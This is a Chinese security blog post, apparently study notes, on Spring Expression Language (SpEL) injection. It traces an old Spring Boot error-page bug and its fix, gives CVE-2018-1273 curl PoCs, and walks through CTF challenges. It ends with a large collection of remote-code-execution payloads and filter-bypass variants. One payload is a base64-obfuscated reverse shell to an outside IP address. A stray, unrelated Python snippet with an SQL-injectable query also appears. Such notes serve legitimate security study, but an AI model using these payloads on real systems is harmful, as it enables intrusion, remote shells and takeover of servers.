@@ -1,0 +1,487 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SpEL表达式注入初见 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SpEL表达式注入初见 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="背景知识
+SpEL注入漏洞是一种安全漏洞，主要发生在使用Spring框架的应用中。Spring Expression Language（SpEL）是一个强大的表达式语言，用于在运行时查询和操作对象图。虽然SpEL提供了很多便利，但如果不正确..." />
+    <meta name="keywords" content="Java,thymeleaf,SpEL,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SpEL表达式注入初见
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-04-22
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/tZ2VQ2HMT/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/oPmzXqAUjU/" class="post-tag">
+                  # thymeleaf
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/EiKKt5PekL/" class="post-tag">
+                  # SpEL
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/spel-biao-da-shi-zhu-ru-chu-jian.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="背景知识">背景知识</h1>
+<p>SpEL注入漏洞是一种安全漏洞，主要发生在使用Spring框架的应用中。Spring Expression Language（SpEL）是一个强大的表达式语言，用于在运行时查询和操作对象图。虽然SpEL提供了很多便利，但如果不正确地处理用户输入，就可能导致注入攻击。</p>
+<p>测试代码：</p>
+<pre><code class="language-java">import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+
+public class MainApp {
+    public static void main(String[] args) {
+        String exp = &quot;new java.lang.ProcessBuilder(new String[]{\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;}).start()&quot;;
+
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(exp);
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        System.out.println(expression.getValue(context));
+
+    }
+}
+</code></pre>
+<h1 id="spel漏洞复现">SpEL漏洞复现</h1>
+<h2 id="低版本springboot中illegalstateexception">低版本SpringBoot中IllegalStateException</h2>
+<p>影响的版本有</p>
+<ul>
+<li>1.1.0-1.1.12</li>
+<li>1.2.0-1.2.7</li>
+<li>1.3.0</li>
+</ul>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;parent&gt;
+  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+  &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+  &lt;version&gt;1.2.0.RELEASE&lt;/version&gt;
+&lt;/parent&gt;
+</code></pre>
+<p>测试代码</p>
+<pre><code class="language-java">package com.example.mywebapp;
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+
+@Controller
+public class exploit {
+    @RequestMapping(&quot;/&quot;)
+    public String index(String payload){
+        throw new IllegalStateException(payload);
+    }
+}
+
+</code></pre>
+<p>访问是一个错误页面，当输入的是一个SpEL表达式的是后可以看到被解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713623131522-2c5170bc-9fec-4090-9c7e-976424ef22b5.png" alt="image.png" loading="lazy"></p>
+<p>漏洞分析从<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>开始，找到最后处理的<code>processDispatchResult</code>函数。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633352226-0ec621b1-2335-4f45-ac34-77b9f333c72d.png" alt="image.png" loading="lazy"></p>
+<p>之前学Thymeleaf的时候对Spring Boot处理请求的流程已经有个大概的了解了，这里<code>IllegalStateException</code>最后会用一个<strong>error View</strong>对象来渲染返回的页面。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633572769-7866d6f6-49a9-4b5c-b5aa-baaeac4d8c18.png" alt="image.png" loading="lazy"></p>
+<p>它的<code>render</code>方法会将渲染所需的数据对象（<strong>model</strong>）设置为渲染上下文的根对象，然后使用一个助手类 <strong>helper</strong> 来处理渲染的模版，也就是上图中<strong>template</strong>的内容<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633832819-0d02fb9b-943c-4906-b3de-62b7453ffed8.png" alt="image.png" loading="lazy"></p>
+<p><code>org.springframework.util.PropertyPlaceholderHelper#parseStringValue</code>是最后用来渲染<strong>template</strong>的函数。</p>
+<ul>
+<li>处理的字符串<code>strVal</code>存在<code>${</code>则对其进行解析</li>
+<li>对待解析的<code>placeholder</code>递归调用一次<code>parseStringValue</code>（有点模版注入的味道了）</li>
+<li>返回的<code>placeholder</code>会交给<code>placeholderResolver.resolvePlaceholder</code>从<strong>model</strong>中取值得到<code>propVal</code></li>
+<li>对<code>propVal</code>再递归调用<code>parseStringValue</code>处理</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/SpEL/1713634117230-474bfa4b-abec-4c66-a77a-0f4def3b2913.png" alt="image.png" loading="lazy"></figure>
+<p>而<code>placeholderResolver.resolvePlaceholder</code>处理方式就是一个SpEL表达式的解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713634489337-1c3d9733-d890-4933-9d30-d54a32484ba2.png" alt="image.png" loading="lazy"></p>
+<p>（Ps.这里解析的表达式直接是一个无任何包裹的字符串，按照SpEL的规则它应该被理解为一个<strong>BeanID</strong>，不过这里却直接被解析为<strong>rootObject</strong>中<strong>HashMap</strong>里面的一个<strong>value</strong>，有一点疑惑<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713634741196-00786bb7-0986-4548-a0b5-b73145066d54.png" alt="image.png" loading="lazy"></p>
+<p>根据它的流程我测试代码如下</p>
+<pre><code class="language-java">public static void main(String[] args) {
+    ModelMap modelMap = new ModelMap();
+    modelMap.addAttribute(&quot;sky&quot;, &quot;blue&quot;);
+    ExpressionParser parser = new SpelExpressionParser();
+    Expression expression = parser.parseExpression(&quot;sky&quot;);
+
+    StandardEvaluationContext context = new StandardEvaluationContext();
+    Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(modelMap);
+    context.setRootObject(map);
+
+    System.out.println(expression.getValue(context));
+}
+</code></pre>
+<p>没有任何悬念的报错了</p>
+<p>以我现在的能力好像还没发探究其中的原因，故在此记录<br>
+）</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>经过分析，当攻击者可以控制<code>propVal</code>的内容将其变为一个恶意的SpEL表达式时，就可以在代码对<code>propVal</code>解析的时候触发。样例中<code>IllegalStateException(payload)</code>将会设置<strong>message</strong>字段为<strong>payload</strong><br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713635254196-93693f3b-16d7-4d50-8ed9-467894e790e1.png" alt="image.png" loading="lazy"></p>
+<p>另外还需注意的是<code>placeholderResolver.resolvePlaceholder</code>返回时会对字符串进行html实体编码来防止XSS</p>
+<h3 id="漏洞修复">漏洞修复</h3>
+<p>在1.3.1版本中为<strong>PlaceholderResolver</strong>新增了一个子类<strong>NonRecursivePlaceholderResolver</strong>，之前<code>PropertyPlaceholderHelper#parseStringValue</code>中<code>placeholderResolver.resolvePlaceholder</code>的调用在新版本中都变成了<strong>NonRecursivePlaceholderResolver</strong>的<code>resolvePlaceholder</code>方法。</p>
+<p>而<strong>PropertyPlaceholderHelper</strong>也新增了一个子类<strong>NonRecursivePropertyPlaceholderHelper</strong>，原来<code>PropertyPlaceholderHelper#parseStringValue</code>的调用全部变成了<code>NonRecursivePropertyPlaceholderHelper#parseStringValue</code>。</p>
+<p>在最初调用的时候会将<strong>placeholderResolver</strong>转为<strong>NonRecursivePlaceholderResolver</strong>对象<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637054082-c364bbc2-3c3f-4f44-9f35-c6c57345ff27.png" alt="image.png" loading="lazy"></p>
+<p><code>NonRecursivePlaceholderResolver#resolvePlaceholder</code>在解析的时候会先判断自身的resolver，如果是<strong>NonRecursivePlaceholderResolver</strong>则不会进行解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637299505-b73c410a-d55f-4440-aee2-00a7e70f9464.png" alt="image.png" loading="lazy"></p>
+<p>我们知道在初次调用<code>parseStringValue</code>的时候传入的<strong>NonRecursivePlaceholderResolver</strong>对象的<strong>resolver</strong>属性是一个<strong>PlaceholderResolver</strong>。也就说在<code>parseStringValue</code>的第一层调用时，SpEL表达式的解析还是正常的，而再像之前版本递归调用解析时，传入的<strong>placeholderResolver</strong>就是一个<strong>NonRecursivePlaceholderResolver</strong>对象，也就不能在这一层进行任何的SpEL表达式的解析了。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637613847-ee6099f0-10ca-4a1c-945e-e16ae4c79271.png" alt="image.png" loading="lazy"></p>
+<h2 id="cve-2018-1273-rce-with-spring-data-commons">CVE-2018-1273: RCE with Spring Data Commons</h2>
+<p>不是很懂Spring Data Commons的使用，故仅记录poc。</p>
+<p>漏洞环境：<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a></p>
+<p>poc</p>
+<pre><code>curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123&quot;
+
+curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')]=test&quot;
+</code></pre>
+<pre><code class="language-python">mu = re.match(r'.*\W', username)
+if mu is None: 
+    # 過濾password中所有英文字母跟等號
+    cflag = False
+    for w in password: 
+        if (w in string.ascii_letters) or (w == &quot;=&quot;): cflag = True
+    if (cflag): 
+        return None
+    else:
+        conn = sqlite3.connect(&quot;user.db&quot;)
+        rows = conn.execute(f&quot;select * from user where (user='{username}') and (pass='{password}');&quot;)
+</code></pre>
+<h1 id="相关题目">相关题目</h1>
+<h2 id="javacon">javacon</h2>
+<p>题目文件：<a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p>
+<p>默认路由会使用解密算法解出Cookie中的username，然后使用<code>getAdvanceValue</code>方法解析username。由于加解密算法知道，所以可以控制username的内容导致SpEL注入。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713684945667-37a33c73-9751-48bf-9ca3-0504bd35e853.png" alt="image.png" loading="lazy"></p>
+<p>需要注意的是<code>parseExpression</code>的第二个参数<code>parserContext</code>，它用来提供特定于解析过程的配置。具体而言，这个参数允许你自定义如何处理和解析表达式，包括定义表达式的前缀和后缀，以及是否应该使用模板模式。这里就自定了解析前缀<code>expressionPrefix</code>和解析后缀<code>expressionSuffix</code><br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713685122146-f4e519bd-d0bd-46aa-acd0-ea8a541f3ca2.png" alt="image.png" loading="lazy"></p>
+<p>可以使用下面的代码进行测试</p>
+<pre><code class="language-java">package com.exploit;
+
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+public class Encryptor {
+    static Logger logger = LoggerFactory.getLogger(Encryptor.class);
+
+    public Encryptor() {
+    }
+
+    public static String encrypt(String key, String initVector, String value) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(1, skeySpec, iv);
+            byte[] encrypted = cipher.doFinal(value.getBytes());
+            return Base64.getUrlEncoder().encodeToString(encrypted);
+        } catch (Exception var7) {
+            logger.warn(var7.getMessage());
+            return null;
+        }
+    }
+
+    public static String decrypt(String key, String initVector, String encrypted) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(2, skeySpec, iv);
+            byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
+            return new String(original);
+        } catch (Exception var7) {
+            logger.warn(var7.getMessage());
+            return null;
+        }
+    }
+
+    public static void main(String[] args) {
+        System.out.println(encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{2*2}&quot;));
+    }
+}
+</code></pre>
+<p>在model中看到解析后的内容<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713685262376-216c2c1d-fa37-4493-909c-069adfc7a763.png" alt="image.png" loading="lazy"></p>
+<p>payload，思路是用反射的方式获取方法调用</p>
+<pre><code>#{''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'open -a Calculator')}
+</code></pre>
+<h2 id="2024红明谷simp1escape">2024红明谷｜Simp1escape</h2>
+<p>AdminController存在模版注入，注入点是hostname<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713725578292-6ca35ca6-34cd-47ff-99be-cc4827676cc6.png" alt="image.png" loading="lazy"></p>
+<p>这道题目才让我感觉SpEL注入和之前学的Thymeleaf模板注入还不够细致，也没我想象的那么简单，故只整理这部分的payload（未经过url编码）</p>
+<pre><code># 阳子的
+[[T(com.sun.org.apache.xalan.internal.utils.ObjectFactory).newInstance(&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;,new java.lang.Boolean(true)).parseRaw('T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjEuMzEuMzIvMjIzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;)').getValue()]]
+
+# 参考：https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE
+[[${__${new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,null),&quot;invoke&quot;,{null,null},{new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Object&quot;),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;).loadClass(&quot;[Ljava.lang.Object;&quot;)}),&quot;exec&quot;,&quot;open -a Calculator&quot;,new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.String&quot;))}__::x}]]
+
+# Thymeleaf模板注入中不带&quot;_&quot;的写法，参考：https://xz.aliyun.com/t/9826
+[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;).getInputStream()).next()}
+]]
+</code></pre>
+<p>之后有空了好好分析一下这道题目。</p>
+<h1 id="杂项">杂项</h1>
+<h2 id="整理偷的payload">整理（偷）的payload</h2>
+<pre><code>// PoC原型
+
+// Runtime
+T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+T(Runtime).getRuntime().exec(&quot;calc&quot;)
+
+// ProcessBuilder
+new java.lang.ProcessBuilder({'calc'}).start()
+new ProcessBuilder({'calc'}).start()
+
+******************************************************************************
+// Bypass技巧
+
+// 反射调用
+T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
+T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
+// byte数组内容的生成后面有脚本
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
+// byte数组内容的生成后面有脚本
+T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
+
+// JavaScript引擎通用PoC
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)
+
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)
+
+// JavaScript引擎+反射调用
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})),)
+
+// JavaScript引擎+URL编码
+// 其中URL编码内容为：
+// 不加最后的getInputStream()也行，因为弹计算器不需要回显
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)
+
+// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功
+''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
+
+// JDK9新增的shell，还未测试
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
+
+// 转自：https://www.jianshu.com/p/ce4ac733a4b9
+
+${pageContext} 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）
+
+${pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)}   获取web路径
+
+${header}  文件头参数
+
+${applicationScope} 获取webRoot
+
+${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())}  执行命令
+
+
+// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。
+
+&lt;p th:text=&quot;${#this.getClass().forName('java.lang.System').getProperty('user.dir')}&quot;&gt;&lt;/p&gt;   //获取web路径
+</code></pre>
+<h2 id="参考链接">参考链接</h2>
+<p>这些链接才是精华！！！<br>
+很好的背景知识：<a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br>
+<a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a><br>
+<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a><br>
+<a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a><br>
+很多payload：<a href="https://xz.aliyun.com/t/9245">https://xz.aliyun.com/t/9245</a><br>
+一道很有意思的题目：<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a><br>
+Thymeleaf模板注入补充：<a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a><br>
+关于：<br>
+<a href="https://www.yulate.com/index.php/archives/48/">https://www.yulate.com/index.php/archives/48/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a></li>
+<li><a href="#spel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">SpEL漏洞复现</a>
+<ul>
+<li><a href="#%E4%BD%8E%E7%89%88%E6%9C%ACspringboot%E4%B8%ADillegalstateexception">低版本SpringBoot中IllegalStateException</a>
+<ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li>
+</ul>
+</li>
+<li><a href="#cve-2018-1273-rce-with-spring-data-commons">CVE-2018-1273: RCE with Spring Data Commons</a></li>
+</ul>
+</li>
+<li><a href="#%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE">相关题目</a>
+<ul>
+<li><a href="#javacon">javacon</a></li>
+<li><a href="#2024%E7%BA%A2%E6%98%8E%E8%B0%B7simp1escape">2024红明谷｜Simp1escape</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9D%82%E9%A1%B9">杂项</a>
+<ul>
+<li><a href="#%E6%95%B4%E7%90%86%E5%81%B7%E7%9A%84payload">整理（偷）的payload</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/">
+              <h3 class="post-title">
+                Thymeleaf模板注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
